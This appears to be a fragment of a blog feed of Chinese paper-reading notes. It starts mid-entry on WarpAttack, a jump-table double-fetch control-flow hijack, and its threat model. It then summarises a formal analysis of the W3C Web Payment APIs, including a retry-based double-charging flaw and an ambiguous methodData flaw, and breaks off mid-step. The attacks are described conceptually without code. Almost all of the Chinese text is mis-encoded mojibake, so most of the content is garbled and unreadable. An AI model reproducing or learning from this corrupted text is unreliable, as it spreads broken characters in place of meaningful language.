ä¸­å­˜åœ¨switchè¯­å¥ï¼Œæ‰§è¡Œæ—¶é€šå¸¸éµå¾ªä»¥ä¸‹æ¨¡å¼ï¼Œç»™å®šä¸€ä¸ªè·³è½¬è¡¨å’Œä¸€ä¸ªç´¢å¼•ï¼Œç¨‹åºé¦–å…ˆè·å–ç´¢å¼•å€¼ä»¥éªŒè¯è¾¹ç•Œæ£€æŸ¥æ˜¯å¦æ»¡è¶³è·³è½¬è¡¨å¤§å°ï¼Œç„¶åå†æ¬¡è·å–ç´¢å¼•å€¼ä»¥è¿›è¡Œå®é™…çš„è·³è½¬å¤„ç†ã€‚ç”±äºç´¢å¼•è¢«å¤šæ¬¡åŠ è½½ï¼ˆè·å–ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¾¹ç•Œæ£€æŸ¥åè¦†ç›–ç´¢å¼•å€¼ï¼Œæœ€ç»ˆå…è®¸åœ¨è·³è½¬è¡¨ä¹‹å¤–è¿›è¡Œä»»æ„è·³è½¬ã€‚</p><p>æœ¬æ–‡ç ”ç©¶äº†ç”±åŒé‡è·å–å¼•å…¥çš„TOCTOUæ¼æ´ï¼Œå¹¶æå‡ºäº†æ”»å‡»WarpAttackï¼Œå¹¶åœ¨firefoxä¸ŠæˆåŠŸå®æ–½</p><h3 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h3><p>æ”»å‡»è€…èƒ½åŠ›ï¼š</p><ul><li>ä»»æ„è¯»å†™ï¼šæ”»å‡»è€…æŒæœ‰ä¸€ä¸ªå†…å­˜æŸåæ¼æ´ï¼ˆå¦‚use-after-freeé”™è¯¯ï¼‰ï¼Œä½¿å…¶èƒ½å¤Ÿè¯»å†™ä»»æ„å†…å­˜ã€‚C&#x2F;C++ ç¨‹åºå®¹æ˜“å—åˆ°æ­¤ç±»æ¼æ´çš„å½±å“</li><li>çº¿ç¨‹æ§åˆ¶ï¼šæ”»å‡»è€…èƒ½å¤Ÿä¸»åŠ¨æ§åˆ¶ä¸è¢«æ”»å‡»ç¨‹åºåœ¨åŒä¸€åœ°å€ç©ºé—´å†…çš„çº¿ç¨‹ã€‚</li><li>Gadgetï¼šå—å®³è€…ç¨‹åºåŒ…å«è¶³å¤Ÿçš„ gadget ä»£ç ç‰‡æ®µï¼Œå³å¸¦æœ‰ç¼–è¯‘å™¨å¼•å…¥çš„åŒé‡è·å–çš„å¼€å…³è·³è½¬è¡¨ã€‚</li></ul><p><em>Gadget æ˜¯ä¸€ç§æœ‰ç”¨çš„æ„é€ å—ï¼Œå¯ä»¥è¢«ç»„åˆæˆæ”»å‡»è½½è·ï¼Œä»¥ç»•è¿‡ç¨‹åºçš„å®‰å…¨æªæ–½å’Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚è¿™äº›æ„é€ å—é€šå¸¸æ˜¯ç”±ç¨‹åºæœ¬èº«çš„ä»£ç ç‰‡æ®µç»„æˆï¼Œä¾‹å¦‚å‡½æ•°çš„ä¸€éƒ¨åˆ†æˆ–æ¡ä»¶åˆ†æ”¯çš„ä¸€å°æ®µä»£ç ã€‚</em></p><p>æ”»å‡»è€…ç›®æ ‡æ˜¯åŠ«æŒæ§åˆ¶æµåˆ°ç‰¹å®šä½ç½®</p><p>é˜²å¾¡å‡è®¾ï¼š</p><p>ä¸å¯æ‰§è¡Œå†…å­˜ï¼šå—å®³è€…ç¨‹åºå—åˆ°DEPä¿æŠ¤ï¼Œæ”»å‡»è€…æ— æ³•æ‰§è¡Œä»»ä½•æ³¨å…¥å¼æ”»å‡»ï¼Œåªèƒ½è¿›è¡Œä»£ç é‡ç”¨æ”»å‡»</p><p>éšæœºåŒ–ï¼šå—å®³è€…ç¨‹åºå—åœ°å€ç©ºé—´éšæœºåŒ–ä¿æŠ¤</p><p>æ§åˆ¶æµä¿æŠ¤ï¼šå—å®³è€…ç¨‹åºåº”ç”¨å®Œå…¨ç²¾ç¡®çš„é™æ€ CFI</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper1:WPA</title>
    <link href="/2023/07/26/ReadPaper1/"/>
    <url>/2023/07/26/ReadPaper1/</url>
    
    <content type="html"><![CDATA[<h2 id="A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-æ”¯ä»˜-API-çš„æ­£å¼å®‰å…¨åˆ†æï¼šæ”»å‡»å’ŒéªŒè¯"><a href="#A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-æ”¯ä»˜-API-çš„æ­£å¼å®‰å…¨åˆ†æï¼šæ”»å‡»å’ŒéªŒè¯" class="headerlink" title="A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web æ”¯ä»˜ API çš„æ­£å¼å®‰å…¨åˆ†æï¼šæ”»å‡»å’ŒéªŒè¯)"></a>A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web æ”¯ä»˜ API çš„æ­£å¼å®‰å…¨åˆ†æï¼šæ”»å‡»å’ŒéªŒè¯)</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>å½“ä¸‹æ”¯ä»˜ç¯å¢ƒå¤šæ ·ï¼Œæœ‰Stripeï¼ŒGoogle payï¼ŒPayPalç­‰å¤šç§æ”¯ä»˜æ–¹å¼ï¼Œå­˜åœ¨çš„é—®é¢˜æœ‰ï¼š</p><ul><li>æ¶æ„é¡¾å®¢å¯èƒ½ä¼šç¯¡æ”¹å•†å®¶ä¸æ”¯ä»˜å¤„ç†æœºæ„ä¹‹é—´çš„ä¿¡æ¯æµ</li><li>æ”¯ä»˜å¤„ç†æœºæ„çš„æ–¹æ¡ˆå¯èƒ½å­˜åœ¨ç¼ºé™·</li><li>ç”¨æˆ·å¯èƒ½ä¼šè¢«å¤šç§ä¸åŒçš„ç”¨æˆ·ç•Œé¢æ‰€å›°æƒ‘ï¼Œä»è€Œæ›´å®¹æ˜“å—åˆ°ç½‘ç»œé’“é±¼æ”»å‡»</li></ul><p>æ­¤å¤–ï¼Œåœ¨é¢å¯¹æœ‰äº›æ”¯ä»˜ç•Œé¢è¾ƒä¸ºå¤æ‚æ—¶ï¼Œç”¨æˆ·å¯èƒ½ç›´æ¥å…³é—­æ”¯ä»˜è¿›ç¨‹</p><p>ä¸ºæ­¤ï¼ŒW3Cï¼ˆWorld Wide Web Consortiumï¼‰ç›®å‰æ­£åœ¨å¼€å‘WPAï¼ˆWeb Payment APIsï¼‰è¿™æ˜¯ä¸€ç§ç®€åŒ–å’Œæ ‡å‡†åŒ–æµè§ˆå™¨ä¸­çš„æ”¯ä»˜å’Œç»“è´¦æµç¨‹çš„æ–¹æ³•ã€‚å…¶ä¸»è¦æ€æƒ³æ˜¯ï¼Œå•†å®¶ä¸å†è‡ªå·±æä¾›ç”¨äºç»“è´¦çš„ç½‘é¡µæˆ–JavaScriptï¼Œè€Œæ˜¯å°†è¿™ä¸ªè¿‡ç¨‹äº¤ç»™ç”¨æˆ·çš„Webæµè§ˆå™¨æ¥å¤„ç†ã€‚æµè§ˆå™¨éšåå‘ˆç°ç»™ç”¨æˆ·å…¨æ–°çš„æ”¯ä»˜ç”¨æˆ·ç•Œé¢ï¼ˆè§å›¾1ï¼‰ï¼Œè¯¥ç•Œé¢ä½äºWebä¸Šä¸‹æ–‡ä¹‹å¤–ã€‚åœ¨è¿™ä¸ªç”¨æˆ·ç•Œé¢ä¸­ï¼Œç”¨æˆ·å¯ä»¥æŸ¥çœ‹è®¢å•ï¼Œé€‰æ‹©ï¼ˆé¢„å…ˆå­˜å‚¨çš„ï¼‰é€è´§åœ°å€ã€æ”¯ä»˜æ–¹å¼å’Œæ”¯ä»˜å¤„ç†å™¨ï¼ˆä¾‹å¦‚ä½¿ç”¨Stripeä¿¡ç”¨å¡ä»˜æ¬¾ï¼‰ã€‚</p><p><img src="/2023/07/26/ReadPaper1/image-20230727152130120.png" alt="image-20230727152130120"></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><ul><li>æœ¬æ–‡çš„åˆ†ææ˜¯åœ¨è¯¦ç»†çš„WebåŸºç¡€è®¾æ–½æ¨¡å‹ä¸­ï¼Œå¯¹Web Paymentçš„é¦–æ¬¡åˆ†æ</li><li>åˆ†æåŸºäºè¿„ä»Šä¸ºæ­¢æœ€å…¨é¢çš„WebåŸºç¡€è®¾æ–½æ¨¡å‹â€”â€”WIMï¼Œå¹¶åšå‡ºäº†é‡è¦æ‰©å±•</li><li>åˆ¶å®šäº†åæ˜ ä½¿ç”¨WPAè¿›è¡Œæ”¯ä»˜çš„å®Œæ•´æ€§çš„ç²¾ç¡®å®‰å…¨å±æ€§ï¼šæ”¯ä»˜æ„å›¾å’Œæ”¯ä»˜å”¯ä¸€æ€§ã€‚åœ¨å°è¯•è¯æ˜è¿™äº›å±æ€§æ—¶ï¼Œå‘ç°äº†ä¸¤ä¸ªå…³é”®æ€§çš„æ¼æ´ï¼Œå¹¶æå‡ºäº†ä¿®å¤æªæ–½</li></ul><h3 id="THE-W3C-WEB-PAYMENT-APIS"><a href="#THE-W3C-WEB-PAYMENT-APIS" class="headerlink" title="THE W3C WEB PAYMENT APIS"></a>THE W3C WEB PAYMENT APIS</h3><h4 id="å®‰å…¨å±æ€§"><a href="#å®‰å…¨å±æ€§" class="headerlink" title="å®‰å…¨å±æ€§"></a>å®‰å…¨å±æ€§</h4><p><strong>æ”¯ä»˜æ„å›¾</strong></p><p>æµè§ˆå™¨ä¼šå°†ç”¨æˆ·è¡¨è¾¾æ„å›¾çš„æ‰€æœ‰æ”¯ä»˜å­˜å‚¨åœ¨ä¸€ä¸ªåä¸ºPaymentIntentsçš„å­—å…¸ä¸­ï¼Œå®ƒä¿è¯äº†æ”¯ä»˜æä¾›è€…åœ¨è¿›è¡Œäº¤æ˜“æ—¶ä¸é¡¾å®¢åœ¨æ”¯ä»˜UIç•Œé¢ä¸­ç¡®è®¤çš„ä¿¡æ¯ä¸€è‡´ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™æ„å‘³ç€æ”¯ä»˜çš„å‘é€æ–¹ã€æ¥æ”¶æ–¹å’Œæ€»é‡‘é¢ä¸é¡¾å®¢åœ¨æµè§ˆå™¨ä¸­ç¡®è®¤çš„ä¿¡æ¯ç›¸ç¬¦ã€‚è¿™ä¸ªå±æ€§å¯ä»¥é˜²æ­¢æ¶æ„æ–¹ä»£è¡¨é¡¾å®¢è¿›è¡Œæœªç»æˆæƒçš„æ”¯ä»˜ã€‚</p><p><strong>æ”¯ä»˜å”¯ä¸€æ€§</strong></p><p>æ¯ä¸ªæ”¯ä»˜æä¾›è€…åˆ™åœ¨å…¶çŠ¶æ€ä¸­å­˜å‚¨æ‰€æœ‰å·²æ‰§è¡Œäº¤æ˜“çš„è®°å½•ï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªåä¸ºâ€transactionsâ€çš„æ˜ å°„è¡¨ä¸­ï¼Œæ”¯ä»˜çš„å”¯ä¸€æ€§ç¡®ä¿å¯¹äºå®¢æˆ·æˆæƒçš„æ¯ç¬”ä»˜æ¬¾ï¼Œä»»ä½•è¯šå®çš„æ”¯ä»˜æä¾›è€…æœ€å¤šæ‰§è¡Œä¸€ä¸ªäº¤æ˜“ï¼Œå¹¶ä¸”è¯¥äº¤æ˜“å…·æœ‰æ­£ç¡®çš„å€¼ã€‚</p><h4 id="å·¥ä½œæµ"><a href="#å·¥ä½œæµ" class="headerlink" title="å·¥ä½œæµ"></a>å·¥ä½œæµ</h4><p><img src="/2023/07/26/ReadPaper1/image-20230727102822005.png" alt="image-20230727102822005"></p><ol><li>å•†å®¶åˆ›å»ºæ”¯ä»˜è¯·æ±‚ï¼Œæ”¯ä»˜è¯·æ±‚ä¸­åŒ…å«å­—æ®µï¼šidï¼ˆæ”¯ä»˜çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼‰&#x2F;å•†å®¶æ¥å—çš„æ”¯ä»˜æ–¹æ³•ï¼ˆmethodDataï¼‰&#x2F;æ€»èŠ±è´¹å’Œä¸€äº›å•†å“å¯é€‰ç»†èŠ‚ï¼ˆdetailsï¼‰&#x2F;ç”¨æˆ·å¿…é¡»æä¾›å“ªäº›æ•°æ®ï¼ˆoptionsï¼šä¾‹å¦‚åœ°å€ï¼Œç”µè¯ï¼‰</li><li>é€šè¿‡Payment Request APIå°†æ•°æ®äº¤ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ ¹æ®æ”¯ä»˜è¯·æ±‚ä¸­çš„ methodDataï¼ˆå•†å®¶æ”¯æŒçš„æ”¯ä»˜æ–¹å¼ï¼‰ä¸å·²æ³¨å†Œçš„æ”¯ä»˜å¤„ç†ç¨‹åºè¿›è¡Œå¯¹æ¯”ï¼Œå¹¶é€‰æ‹©åœ¨ methodData ä¸­è‡³å°‘ä¸€ç§æ”¯ä»˜æ–¹å¼æ³¨å†Œçš„æ‰€æœ‰æ”¯ä»˜å¤„ç†ç¨‹åºã€‚</li><li>åœ¨è¿›è¡Œåˆæ­¥é€‰æ‹©åï¼Œæµè§ˆå™¨å¯¹æ¯ä¸ªé€‰ä¸­çš„æ”¯ä»˜å¤„ç†ç¨‹åºè§¦å‘ CanMakePaymentEventï¼ˆæ”¯ä»˜æ˜¯å¦å¯è¿›è¡Œäº‹ä»¶ï¼‰ã€‚æ­¤äº‹ä»¶åŒ…å«æœ‰å…³æ‰€è¯·æ±‚æ”¯ä»˜çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚å•†å®¶é¡¶å±‚é¡µé¢çš„æºåœ°å€ã€æ”¯ä»˜è¯·æ±‚å‘èµ·çš„æºåœ°å€ä»¥åŠé€‚ç”¨çš„æ”¯ä»˜æ–¹å¼æ•°æ®é›†ï¼ˆæ¥è‡ª PR.methodDataï¼‰</li><li>æ”¯ä»˜å¤„ç†ç¨‹åºåœ¨æ¥æ”¶ CanMakePaymentEvent åç¡®å®šæ˜¯å¦å¯ä»¥å¤„ç†è¯¥æ”¯ä»˜è¯·æ±‚ã€‚æ­¤å†³ç­–è¿‡ç¨‹ç‰¹å®šäºæ”¯ä»˜æ–¹å¼ï¼Œå¹¶å¯èƒ½å–å†³äºæ³•å¾‹è¦æ±‚ã€‚</li><li>åœ¨æ¥æ”¶å®Œæ‰€æœ‰è§¦å‘çš„æ”¯ä»˜å¤„ç†ç¨‹åºçš„å“åº”åï¼Œæµè§ˆå™¨æ˜¾ç¤ºä¸€ä¸ªç‰¹æ®Šçš„å¯¹è¯æ¡†ï¼Œç§°ä¸ºæ”¯ä»˜ UIï¼ˆç”¨æˆ·ç•Œé¢ï¼‰ã€‚è¿™ä¸ªæ”¯ä»˜ UI ä¸æ˜¯ç½‘ç«™çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯æµè§ˆå™¨æœ¬èº«çš„ç•Œé¢ï¼ˆå‚è§å›¾1ï¼‰ã€‚æ”¯ä»˜ UI å…è®¸é¡¾å®¢è¾“å…¥ï¼ˆæˆ–é€‰æ‹©å­˜å‚¨çš„ï¼‰æ‰€éœ€ä¿¡æ¯ï¼Œå¦‚é€è´§åœ°å€ã€ç”µå­é‚®ä»¶åœ°å€ä»¥åŠæ”¯ä»˜è¯¦ç»†ä¿¡æ¯ã€‚</li><li>æ”¯ä»˜è¯¦ç»†ä¿¡æ¯åŒ…æ‹¬é€‰æ‹©å¯ç”¨æ”¯ä»˜å¤„ç†ç¨‹åºå’Œæ”¯ä»˜æ–¹å¼ã€‚å¦‚æœé¡¾å®¢è¾“å…¥ï¼ˆæˆ–é€‰æ‹©å­˜å‚¨çš„æˆ–æ›´æ”¹çš„ï¼‰é€è´§åœ°å€ï¼Œè¿˜éœ€è¦é¢å¤–çš„æ­¥éª¤ï¼šå› ä¸ºè¿™å¯èƒ½ä¼šæ”¹å˜é€è´§è´¹ç”¨ï¼Œå› æ­¤å•†å®¶ç½‘ç«™ä¼šæ”¶åˆ°ä¸€ä¸ªéƒ¨åˆ†åŒ¿ååŒ–çš„åœ°å€ä»¥é‡æ–°è®¡ç®—é€è´§è´¹ç”¨ã€‚</li><li>é¡¾å®¢æäº¤é€‰æ‹©åï¼Œæµè§ˆå™¨ç»„è£…ä¸€ä¸ª PaymentRequestEventï¼ˆæ”¯ä»˜è¯·æ±‚äº‹ä»¶ï¼‰å¹¶å°†å…¶äº¤ç»™é¡¾å®¢é€‰æ‹©çš„æ”¯ä»˜å¤„ç†ç¨‹åºã€‚è¯¥ PaymentRequestEvent åŒ…å«ä¸ CanMakePaymentEvent ç›¸åŒçš„æ•°æ®ï¼ˆè§ä¸Šæ–‡ï¼‰ï¼Œä»¥åŠé¡¾å®¢è¾“å…¥çš„æ”¯ä»˜æ•°æ®ï¼Œå¦‚ä¿¡ç”¨å¡å·ã€è¿‡æœŸæ—¥æœŸå’ŒéªŒè¯å·ç ã€‚</li><li>åœ¨æ¥æ”¶ PaymentRequestEvent åï¼Œæ”¯ä»˜å¤„ç†ç¨‹åºé‡‡å–å¿…è¦çš„æ­¥éª¤æ¥æ‰§è¡Œæˆ–è‡³å°‘ä¿ƒè¿›æ”¯ä»˜ã€‚</li><li>åœ¨æ‰§è¡Œè¿™äº›æ­¥éª¤åï¼Œæ”¯ä»˜å¤„ç†ç¨‹åºé€šè¿‡åˆ›å»º PaymentHandlerResponseï¼ˆæ”¯ä»˜å¤„ç†ç¨‹åºå“åº”ï¼‰æ¥å®Œæˆå…¶å·¥ä½œã€‚æ­¤å“åº”åŒ…å«ï¼ˆå†æ¬¡ï¼‰æ”¯ä»˜æ–¹å¼æ ‡è¯†ç¬¦å’Œä¸€ä¸ª details å­—æ®µï¼Œå…¶ç¡®åˆ‡å†…å®¹å–å†³äºæ”¯ä»˜æ–¹å¼ã€‚details çš„å†…å®¹å¯ä»¥æ˜¯æ”¯ä»˜æä¾›è€…çš„æŸäº›ç­¾åæ”¯ä»˜ç¡®è®¤ï¼Œæˆ–è€…ä»…ä¸ºâ€œåæ˜ â€ä¿¡ç”¨å¡æ•°æ®ç­‰ç®€å•å†…å®¹ã€‚</li><li>æ”¶åˆ°æ”¯ä»˜å¤„ç†ç¨‹åºå“åº”åï¼Œæµè§ˆå™¨åˆ›å»ºä¸€ä¸ªæ”¯ä»˜å“åº”å¹¶å°†å…¶è¿”å›ç»™å•†å®¶çš„ç½‘ç«™ã€‚æ”¯ä»˜å“åº”åŒ…å«æ¥è‡ªå¤„ç†ç¨‹åºå“åº”çš„ detailsã€æ‰€é€‰æ”¯ä»˜æ–¹å¼ä»¥åŠå•†å®¶åœ¨ PR.options ä¸­è¯·æ±‚çš„é¢å¤–æ•°æ®ï¼Œå¦‚é€è´§åœ°å€ã€‚</li><li>å•†å®¶ç°åœ¨å¯ä»¥æ£€æŸ¥å“åº”ï¼ˆä¾‹å¦‚ï¼ŒéªŒè¯ä¿¡ç”¨å¡æ•°æ®çš„æœ‰æ•ˆæ€§ï¼‰å¹¶é€šè¿‡è¡¨ç¤ºç»“è´¦è¿‡ç¨‹å®Œæˆï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å…³é—­æ”¯ä»˜ UIï¼‰æˆ–è¡¨ç¤ºå‡ºç°é—®é¢˜è€Œç»ˆæ­¢æµç¨‹ã€‚</li></ol><p>ä¸€æ—¦é¡¾å®¢è¿›è¡Œäº†ä¿®æ”¹å¹¶é‡æ–°æäº¤ï¼Œæµè§ˆå™¨ä¼šå‘éšåé€‰æ‹©çš„æ”¯ä»˜å¤„ç†ç¨‹åºè§¦å‘å¦ä¸€ä¸ª PaymentRequestEventï¼Œå…¶ä¸­åŒ…å«ç›¸åŒçš„æ”¯ä»˜æ ‡è¯†ç¬¦ï¼Œä½†å¯èƒ½ä¸åŒçš„æ”¯ä»˜ç»†èŠ‚ï¼ˆä¾‹å¦‚ï¼Œç”±é¡¾å®¢é€‰æ‹©çš„ä¸åŒæ”¯ä»˜æ–¹å¼ï¼‰ã€‚æ”¯ä»˜å¤„ç†ç¨‹åºç„¶åå¤„ç†å¹¶å¯èƒ½æ›´æ–°æ”¯ä»˜ï¼ˆå¦‚æœ‰å¿…è¦ï¼‰ï¼Œå†æ¬¡ç”¨å¤„ç†ç¨‹åºå“åº”è§¦å‘æµè§ˆå™¨åˆ›å»ºæ”¯ä»˜å“åº”å¹¶å°†å…¶äº¤ç»™å•†å®¶ã€‚æ­¤æ—¶ï¼Œå•†å®¶å¯ä»¥å†æ¬¡æ¥å—æ”¯ä»˜å“åº”æˆ–å‘èµ·å¦ä¸€ä¸ªé‡è¯•ã€‚</p><h4 id="å­˜åœ¨çš„æ¼æ´"><a href="#å­˜åœ¨çš„æ¼æ´" class="headerlink" title="å­˜åœ¨çš„æ¼æ´"></a>å­˜åœ¨çš„æ¼æ´</h4><p><strong>Double Charging with Retryï¼ˆé‡è¯•å¼•èµ·çš„é‡å¤æ”¯ä»˜ï¼‰</strong></p><p>åœ¨è¿™ä¸ªæ”»å‡»è¿‡ç¨‹ä¸­ï¼Œå‡è®¾æœ‰ä¸€ä¸ªæ¶æ„å•†å®¶å’Œä¸€ä¸ªè¯šå®çš„é¡¾å®¢ã€‚æ”»å‡»åˆ©ç”¨äº†WPAä¸­çš„é‡è¯•æœºåˆ¶ã€‚</p><ol><li>é¡¾å®¢å‘èµ·ç»“è´¦ï¼šé¡¾å®¢åœ¨æ¶æ„å•†å®¶çš„ç½‘ç«™ä¸Šå‘èµ·ç»“è´¦è¯·æ±‚ã€‚</li><li>å•†å®¶åˆ›å»ºæ”¯ä»˜è¯·æ±‚ï¼šå•†å®¶åˆ›å»ºä¸€ä¸ªæ­£å¸¸çš„æ”¯ä»˜è¯·æ±‚ï¼Œå¹¶å°†å…¶äº¤ç»™æµè§ˆå™¨å¤„ç†ã€‚</li><li>æµè§ˆå™¨å¼•å¯¼æ”¯ä»˜æµç¨‹ï¼šæµè§ˆå™¨æ ¹æ®WPAè§„èŒƒçš„æ­¥éª¤ï¼Œå¼•å¯¼é¡¾å®¢å®Œæˆæ”¯ä»˜æµç¨‹çš„æ­¥éª¤6åˆ°11ï¼Œè¿™åŒ…æ‹¬é€‰æ‹©æ”¯ä»˜æ–¹å¼ã€ç¡®è®¤æ”¯ä»˜ç­‰ã€‚</li><li>æ”¶åˆ°æ”¯ä»˜å“åº”ï¼šå•†å®¶æ”¶åˆ°é¡¾å®¢çš„æ”¯ä»˜å“åº”ï¼Œä½†åœ¨è¿™é‡Œè¿›è¡Œäº†æ”»å‡»ã€‚</li><li>è§¦å‘é‡è¯•ï¼šå•†å®¶è§¦å‘äº†ä¸€ä¸ªé‡è¯•è¯·æ±‚ï¼ˆretryï¼‰ï¼Œè¿™æ„å‘³ç€å•†å®¶åœ¨ç¬¬ä¸€æ¬¡æ”¯ä»˜æ—¶å‡ºç°äº†é—®é¢˜ï¼Œè¦æ±‚é¡¾å®¢åˆ‡æ¢åˆ°ä¸åŒçš„æ”¯ä»˜å¤„ç†å™¨å’Œæ”¯ä»˜æ–¹å¼æä¾›å•†ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªæ”¯ä»˜æ–¹å¼æ®ç§°ä¸èµ·ä½œç”¨ã€‚</li><li>æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼šæµè§ˆå™¨åœ¨å…¶æ”¯ä»˜ç•Œé¢ä¸­æ˜¾ç¤ºäº†é”™è¯¯ä¿¡æ¯ï¼Œå‘ŠçŸ¥é¡¾å®¢éœ€è¦åˆ‡æ¢æ”¯ä»˜æ–¹å¼ã€‚</li><li>é¡¾å®¢é€‰æ‹©ä¸åŒçš„æ”¯ä»˜æ–¹å¼ï¼šç”±äºé¡¾å®¢è®¤ä¸ºç¬¬ä¸€ä¸ªæ”¯ä»˜æ–¹å¼å­˜åœ¨é—®é¢˜ï¼Œå¥¹é€‰æ‹©äº†ä¸åŒçš„æ”¯ä»˜å¤„ç†å™¨å’Œæ”¯ä»˜æ–¹å¼æä¾›å•†ï¼Œå¹¶å†æ¬¡æäº¤æ”¯ä»˜è¯·æ±‚ã€‚</li><li>è§¦å‘æ–°çš„æ”¯ä»˜å¤„ç†å™¨ï¼šæµè§ˆå™¨è§¦å‘äº†æ–°çš„æ”¯ä»˜å¤„ç†å™¨ï¼Œè¯¥å¤„ç†å™¨æ‰§è¡Œç¬¬äºŒæ¬¡æ”¯ä»˜ã€‚</li><li>ç¬¬äºŒæ¬¡æ”¯ä»˜ï¼šæ–°çš„æ”¯ä»˜å¤„ç†å™¨æ‰§è¡Œäº†ç¬¬äºŒæ¬¡æ”¯ä»˜ï¼Œè¿™å°±æ˜¯æ”»å‡»å®ç°äº†åŒé‡æ”¶è´¹çš„åœ°æ–¹ã€‚</li><li>ç»“è´¦å®Œæˆï¼šæ”»å‡»å®Œæˆåï¼Œæ•´ä¸ªç»“è´¦æµç¨‹ç»§ç»­è¿›è¡Œï¼Œé¡¾å®¢å®Œæˆäº†æ”¯ä»˜æµç¨‹ï¼Œè€Œæ²¡æœ‰ä»»ä½•æç¤ºè¡¨æ˜å¥¹æ”¯ä»˜äº†ä¸¤æ¬¡ã€‚</li></ol><p>è¿™ä¸ªæ”»å‡»æ˜¯ç”±äºæµè§ˆå™¨çš„è¡Œä¸ºï¼Œè€Œä¸æ˜¯æ”¯ä»˜å¤„ç†å™¨çš„å®ç°ã€‚ç¬¬äºŒä¸ªæ”¯ä»˜å¤„ç†å™¨æ— æ³•æ£€æµ‹åˆ°å®ƒæ˜¯åœ¨é‡è¯•ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨çš„ï¼Œå› ä¸ºå®ƒä¹‹å‰æ²¡æœ‰è§è¿‡æ•´ä¸ªäº¤æ˜“çš„æ”¯ä»˜idã€‚æ”»å‡»è€…å¯ä»¥åå¤åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œè®©é¡¾å®¢åå¤è¢«æ”¶å–åŒé‡è´¹ç”¨ï¼Œè€Œå•†å®¶å’Œæ”¯ä»˜å¤„ç†å™¨æ— æ³•å¯Ÿè§‰ã€‚</p><p>ä¿®å¤æªæ–½ï¼š</p><p>å¯ä»¥åœ¨äº¤æ˜“é‡å¤ä½¿ç”¨ä¸åŒå¤„ç†ç¨‹åºæ—¶é€šçŸ¥æ”¯ä»˜å¤„ç†ç¨‹åºï¼Œä»¥ä¾¿å®ƒå¯ä»¥æ’¤é”€æ”¯ä»˜å¹¶åœ¨æˆåŠŸæ’¤é”€åå†è§¦å‘ç¬¬äºŒä¸ªæ”¯ä»˜å¤„ç†ç¨‹åºã€‚æˆ–è€…æ”¯ä»˜å¤„ç†ç¨‹åºå¯ä»¥åœ¨å…¶å“åº”ä¸­åŒ…å«ä¸€ä¸ªçŠ¶æ€ï¼ŒæŒ‡ç¤ºæ˜¯å¦å·²ç»è¿›è¡Œäº†æ”¯ä»˜ï¼Œå¹¶é˜»æ­¢åœ¨è¿™ç§æƒ…å†µä¸‹æ›´æ”¹æ”¯ä»˜å¤„ç†ç¨‹åºã€‚åœ¨ä¸W3C Web Payments Working Groupçš„è®¨è®ºä¸­ï¼Œä»–ä»¬é€‰æ‹©äº†ä¸€ä¸ªéå¸¸ç®€å•çš„ä¿®å¤æ–¹æ³•ï¼Œå³å®Œå…¨ç¦æ­¢æ›´æ”¹æ”¯ä»˜å¤„ç†ç¨‹åºï¼Œå°½ç®¡è¿™å¯èƒ½ä¼šè¿«ä½¿é¡¾å®¢ä¸­æ­¢æ•´ä¸ªæµç¨‹ï¼Œå¦‚æœä¸€å¼€å§‹é€‰æ‹©çš„æ”¯ä»˜å¤„ç†ç¨‹åºå®é™…ä¸Šä¸èƒ½æ­£å¸¸å·¥ä½œã€‚è¿™æ˜¯è§„èŒƒæœ€ç»ˆé‡‡ç”¨çš„æ–¹æ³•ã€‚</p><p><strong>Ambiguous Payment Method Dataï¼ˆæ¨¡æ£±ä¸¤å¯çš„æ”¯ä»˜æ•°æ®ï¼‰</strong></p><p>åœ¨è¿™ä¸ªæ”»å‡»è¿‡ç¨‹ä¸­ï¼Œå‡è®¾å•†å®¶æ˜¯æ¶æ„çš„ï¼Œè€Œå…¶ä»–äººéƒ½æ˜¯è¯šå®çš„ã€‚æ”»å‡»åˆ©ç”¨äº†WPAè§„èŒƒä¸­çš„ä¸€ä¸ªç‰¹å®šå­—æ®µâ€”â€”methodDataã€‚ä»¥ä¸‹æ˜¯æ”»å‡»çš„æ­¥éª¤ï¼š</p><ol><li>å•†å®¶åˆ›å»ºæ”¯ä»˜è¯·æ±‚ï¼šå•†å®¶åˆ›å»ºä¸€ä¸ªæ”¯ä»˜è¯·æ±‚PRï¼Œå…¶ä¸­methodDataå­—æ®µåŒ…å«ä¸¤ä¸ªæ¡ç›®ï¼Œéƒ½æ˜¯ç›¸åŒçš„æ”¯ä»˜æ–¹å¼ï¼Œå³å…·æœ‰ç›¸åŒçš„æ”¯ä»˜æ–¹å¼æ ‡è¯†ç¬¦ã€‚æ 